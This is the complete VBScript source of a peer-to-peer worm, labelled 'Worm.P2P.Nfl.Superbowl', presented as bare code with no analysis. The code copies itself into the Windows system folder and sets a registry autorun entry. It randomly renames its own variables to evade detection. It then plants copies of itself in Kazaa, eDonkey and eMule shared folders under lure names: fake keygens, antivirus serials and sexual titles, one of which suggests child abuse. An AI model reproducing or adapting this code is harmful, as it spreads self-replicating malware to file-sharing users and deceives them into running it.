On error Resume Next
set shell = createobject("wscript.shell")
set fso = createobject("scripting.filesystemobject")
SuperBowl = wscript.scriptfullname
fso.copyfile SuperBowl,fso.getspecialfolder(1) & "\Superbowl.vbs"
shell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Superbowl",fso.getspecialfolder(1)& "\Superbowl.vbs"
Pgdir = shell.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
shell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows Nt\CurrentVersion\Winlogon\LegalNoticeCaption\Superbowl"
shell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows Nt\CurrentVersion\Winlogon\LegalNoticeText\(c) by Energy"
if day(now()) = 2 and month(now()) = 1 then
msgbox "Yeahh, SuperBowl are here", vbInformation,"Worm.P2P.Nfl.Superbowl by Energy"
end if
randomize
set vbsfile=fso.opentextfile(wscript.scriptfullname,1,false)
code=vbsfile.readall
vars=array("code","vars","var","newlet","num","newlet","fso","SuperBowl","kl","kazaa","edonkey","emule") '
for each var in vars
for num=1 to int(rnd*14) + 2
if int(rnd*2)+1=1 then
newlet=newlet& ucase(chr((int(rnd*22)+97)))
if int(rnd*2)+1=1 then
newlet=newlet & int(rnd*int(rnd*4))
end if
else
newlet=newlet&lcase(chr((int(rnd*22)+97)))
if int(rnd*2)+1=1 then
newlet=newlet&int(rnd *2)
else
newlet=newlet&int(rnd*int(rnd*6))
end if
end if
next
code=replace(code,var,newlet)
newlet=""
next
set vbsfile=fso.opentextfile(wscript.scriptfullname,2,false)
kl = (Pgdir & "\kazaa lite\my shared folder") & "\"
if fso.folderexists(kl) then
fso.copyfile SuperBowl,kl & "Nfl Halftime.vbs"
fso.copyfile SuperBowl,kl & "Unreal_II_The _Awenking_Cd1_Cd2_Loader.vbs"
fso.copyfile SuperBowl,kl & "SiSoftSandraPro2003.vbs"
fso.copyfile SuperBowl,kl & "Ad-aware_6_Plus_KeyGen.vbs"
fso.copyfile SuperBowl,kl & "AVP_4_KeyGen.vbs"
fso.copyfile SuperBowl,kl & "Norten_Internet_Security_2003_Serial.vbs"
fso.copyfile SuperBowl,kl & "ChicasScreener.vbs"
fso.copyfile SuperBowl,kl & "Teen_Porn_Screener.vbs"
fso.copyfile SuperBowl,kl & "Illegal_14Years_Taboo_Sex.vbs"
fso.copyfile SuperBowl,kl & "Energy_a_Member_of_Brigada_Ocho.vbs"
fso.copyfile SuperBowl,kl & ".vbs"
fso.copyfile SuperBowl,kl & ".vbs"
end if
kazaa = (Pgdir & "\kazaa\my shared folder") & "\"
if fso.folderexists(kazaa) then
fso.copyfile SuperBowl,kazaa & "Nfl Halftime.vbs"
fso.copyfile SuperBowl,kazaa & "Unreal_II_The _Awenking_Cd1_Cd2_Loader.vbs"
fso.copyfile SuperBowl,kazaa & "SiSoftSandraPro2003.vbs"
fso.copyfile SuperBowl,kazaa & "Ad-aware_6_Plus_KeyGen.vbs"
fso.copyfile SuperBowl,kazaa & "AVP_4_KeyGen.vbs"
fso.copyfile SuperBowl,kazaa & "Norten_Internet_Security_2003_Serial.vbs"
fso.copyfile SuperBowl,kazaa & "ChicasScreener.vbs"
fso.copyfile SuperBowl,kazaa & "Teen_Porn_Screener.vbs"
fso.copyfile SuperBowl,kazaa & "Illegal_14Years_Taboo_Sex.vbs"
fso.copyfile SuperBowl,kazaa & "Energy_a_Member_of_Brigada_Ocho.vbs"
fso.copyfile SuperBowl,kazaa & ".vbs"
fso.copyfile SuperBowl,kazaa & ".vbs"
end if
edonkey = (Pgdir & "\edonkey2000\incoming") & "\"
if fso.folderexists(edonkey) then
fso.copyfile SuperBowl,edonkey & "Nfl Halftime.vbs"
fso.copyfile SuperBowl,edonkey & "Unreal_II_The _Awenking_Cd1_Cd2_Loader.vbs"
fso.copyfile SuperBowl,edonkey & "SiSoftSandraPro2003.vbs"
fso.copyfile SuperBowl,edonkey & "Ad-aware_6_Plus_KeyGen.vbs"
fso.copyfile SuperBowl,edonkey & "AVP_4_KeyGen.vbs"
fso.copyfile SuperBowl,edonkey & "Norten_Internet_Security_2003_Serial.vbs"
fso.copyfile SuperBowl,edonkey & "ChicasScreener.vbs"
fso.copyfile SuperBowl,edonkey & "Teen_Porn_Screener.vbs"
fso.copyfile SuperBowl,edonkey & "Illegal_14Years_Taboo_Sex.vbs"
fso.copyfile SuperBowl,edonkey & "Energy_a_Member_of_Brigada_Ocho.vbs"
fso.copyfile SuperBowl,edonkey & ".vbs"
fso.copyfile SuperBowl,edonkey & ".vbs"
end if
emule = (Pgdir & "\emule\incoming") & "\"
if fso.folderexists(edonkey) then
fso.copyfile SuperBowl,emule & "Nfl Halftime.vbs"
fso.copyfile SuperBowl,emule & "Unreal_II_The _Awenking_Cd1_Cd2_Loader.vbs"
fso.copyfile SuperBowl,emule & "SiSoftSandraPro2003.vbs"
fso.copyfile SuperBowl,emule & "Ad-aware_6_Plus_KeyGen.vbs"
fso.copyfile SuperBowl,emule & "AVP_4_KeyGen.vbs"
fso.copyfile SuperBowl,emule & "Norten_Internet_Security_2003_Serial.vbs"
fso.copyfile SuperBowl,emule & "ChicasScreener.vbs"
fso.copyfile SuperBowl,emule & "Teen_Porn_Screener.vbs"
fso.copyfile SuperBowl,emule & "Illegal_14Years_Taboo_Sex.vbs"
fso.copyfile SuperBowl,emule & "Energy_a_Member_of_Brigada_Ocho.vbs"
fso.copyfile SuperBowl,emule & ".vbs"
fso.copyfile SuperBowl,emule & ".vbs"
vbsfile.write code
end if
